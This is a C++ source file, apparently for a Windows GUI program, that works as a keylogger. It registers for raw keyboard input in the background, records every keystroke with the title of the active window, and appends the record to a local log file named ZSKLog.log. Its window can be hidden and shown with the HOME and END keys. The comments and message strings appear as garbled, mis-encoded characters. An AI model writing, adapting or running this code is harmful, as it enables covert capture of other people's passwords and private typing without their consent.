#include "StdAfx.h"
#include "MainWnd.h"
#include "vkey.h"
CMainWnd::CMainWnd(void)
{

} 


CMainWnd::~CMainWnd(void)
{
}

LRESULT CMainWnd::HandleMessage( UINT uMsg, WPARAM wParam, LPARAM lParam )
{
	LPBYTE lpb = NULL;
	RAWINPUT * raw = NULL;
	DWORD dwWritten = 0;
	UINT dwSize;
	try
	{
		if (uMsg == WM_NCLBUTTONDBLCLK)
			return 1;
		else if (uMsg == WM_INPUT)//windows֪ͨӦ�ó���,���豸������Ϣ
		{
			if (GetRawInputData == NULL)//�ж�ǰ���ȡGetRawInputData API��ַ�Ƿ��Ѿ��ɹ���
				return true;
			//��һ�ε��� ,Ŀ���ǻ�ȡ��Ϣ���ڴ��ֽ���
			GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
			//��̬����һƬ�ڴ�
			lpb = new byte[dwSize];
			if (lpb == NULL)
			{
				MessageBoxA(this->GetHWND(), "�����ڴ�ʧ��", "Error", MB_OK);
				return true;
			}
			//�ڴ���������Ժ�,��ʼ�ڶ��ε���,Ŀ������ʽ�Ļ�ȡ��Ϣ��¼
			if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize)
			{
				MessageBoxA(this->GetHWND(), "��ȡԭʼ�����豸��Ϣʧ��", "Error", MB_OK);
				return true;
			}
			raw = (RAWINPUT*)lpb;
			char szKeyLog[256] = { '\0' };
			if (raw->header.dwType == RIM_TYPEKEYBOARD)
			{
				//��ȡ���˵�ǰ�����豸��Ϣ

				//��ȡ��ǰ���ڵı���
				HWND hwnd = GetForegroundWindow();
				char szWndTitle[256];
				GetWindowTextA(hwnd, szWndTitle, 256);

				//������Ҫ����Ϣ
				sprintf_s(szKeyLog, sizeof(szKeyLog), "[%s -0x%X]:%s\r\n", szWndTitle, hwnd, GetKeyName(raw->data.keyboard.VKey));
				if (hFile != INVALID_HANDLE_VALUE)
				{
					SetFilePointer(hFile, 0, 0, FILE_END);
					WriteFile(hFile, szKeyLog, strlen(szKeyLog), &dwWritten, NULL);
				}
				//char ת unicode
				int unicodeLen = ::MultiByteToWideChar(CP_ACP, 0, szKeyLog, -1, 0, 0);
				WCHAR * wszKeyLog = new WCHAR[unicodeLen];
				memset(wszKeyLog, 0, sizeof(WCHAR)*unicodeLen);
				::MultiByteToWideChar(CP_ACP, 0, szKeyLog, -1, wszKeyLog, unicodeLen);
				//��ʾ��������ȥ
				pMsgLabel->SetText(wszKeyLog);
				
				//�����HOME��ʾ��������,�����END��,���ؼ�����
				if (VK_HOME == raw->data.keyboard.VKey)
					this->ShowWindow(true);
				else if (VK_END == raw->data.keyboard.VKey)
					this->ShowWindow(false);
			}
			else if (raw->header.dwType == RIM_TYPEMOUSE)
			{
			}
			delete [] lpb;

		}
		return WindowImplBase::HandleMessage(uMsg,wParam,lParam);
	}
	catch (...)
	{
		throw "CMainWnd::HandleMessage";
	}
}

void CMainWnd::InitWindow()
{
	try
	{
		WindowImplBase::InitWindow();
		pCloseBtn = static_cast<CButtonUI*>(m_PaintManager.FindControl(_T("SysCloseBtn")));
		pCloseBtn->OnNotify += MakeDelegate(this, &CMainWnd::OnCloseBtnClick, _T("click"));
		pMsgLabel = static_cast<CLabelUI*>(m_PaintManager.FindControl(_T("msg")));

		HMODULE htmp = LoadLibraryA("User32.dll");
		if (htmp)
		{
			RegisterRawInputDevices = (PRegisterRawInputDevices)GetProcAddress(htmp, "RegisterRawInputDevices");
			if (!RegisterRawInputDevices)
			{
				MessageBoxA(NULL, "��ȡRegisterRawInputDevices������ַʧ��", "Error", MB_OK);
				return;
			}
		}
		if (htmp)
		{
			GetRawInputData = (PGetRawInputData)GetProcAddress(htmp, "GetRawInputData");
			if (!GetRawInputData)
			{
				MessageBoxA(NULL, "��ȡGetRawInputData������ַʧ��", "Error", MB_OK);
				return;
			}
		}

		RAWINPUTDEVICE rid;
		rid.dwFlags = RIDEV_INPUTSINK;
		rid.usUsagePage = 0x01;
		rid.usUsage = 0x06;
		rid.hwndTarget = this->GetHWND();
		//ע��ԭʼ�����豸
		RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));

		hFile = CreateFileA(".\\ZSKLog.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			MessageBoxA(this->GetHWND(), "������¼�ļ�ʧ��", "Error", MB_OK);
			return;
		}



		pMsgLabel->SetText(_T("ϵͳ��ʼ����ɣ�����NB!"));
	}
	catch (...)
	{
		throw "CMainWnd::Init";
	}
}

//************************************
// ��������: Notify
// ��������: void
// ������Ϣ: TNotifyUI & msg
// ����˵��: 
//************************************
void CMainWnd::Notify( TNotifyUI& msg )
{
	WindowImplBase::Notify(msg);
}
//************************************
// ��������: OnCloseBtnClick
// ��������: bool
// ������Ϣ: TNotifyUI* pTNotifyUI
// ����˵��: �رհ�ť��Ӧ����Ӧ����
//************************************
bool CMainWnd::OnCloseBtnClick(TNotifyUI* pTNotifyUI, LPARAM lParam, WPARAM wParam)
{
	PostQuitMessage(0);
	return true;
}
